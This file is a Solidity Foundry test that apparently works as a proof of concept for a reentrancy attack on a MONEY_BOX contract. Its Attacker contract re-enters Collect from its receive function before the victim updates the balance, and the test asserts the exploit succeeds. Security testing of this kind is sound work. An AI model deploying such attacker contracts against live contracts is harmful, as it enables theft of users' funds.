
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/MONEY_BOX.sol";

contract TestReentrancyMONEY_BOX is Test {

    MONEY_BOX public box;
    Log public logFile;
    Attacker public _attacker;

    function setUp() public {
        logFile = new Log();
        box = new MONEY_BOX();
        box.SetMinSum(1);
        box.SetLogFile(address(logFile));
        box.Initialized();
        _attacker = new Attacker(address(box));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal > 0 && attackVal >= 1 && attackVal <= type(uint128).max / 2);
        

        // --- 2. State Configuration (Pre-Condition) ---

        // --- 3. Funding ---
        
        vm.deal(address(box), attackVal * 2); 
        
        vm.deal(address(_attacker), attackVal * 2);

        vm.deal(address(this), attackVal * 2);

        
        
        _attacker.setupAttack{value: attackVal * 2}(attackVal);
        vm.warp(block.timestamp + 100);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    MONEY_BOX public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public attackValStored;
    bool public reenteredBeforeUpdate;

    constructor(address victimAddress) { 
        victim = MONEY_BOX(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        victim.Put{value: val * 2}(1);
    }

    function attack(uint256 val) public {
        initialSnapshot = victim.Acc(address(this)).balance;

        attackValStored = val;

        victim.Collect(val);

        if (reenteredBeforeUpdate) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            if (victim.Acc(address(this)).balance == initialSnapshot) {
                reenteredBeforeUpdate = true;
            }
            victim.Collect(attackValStored);
        }
    }
}
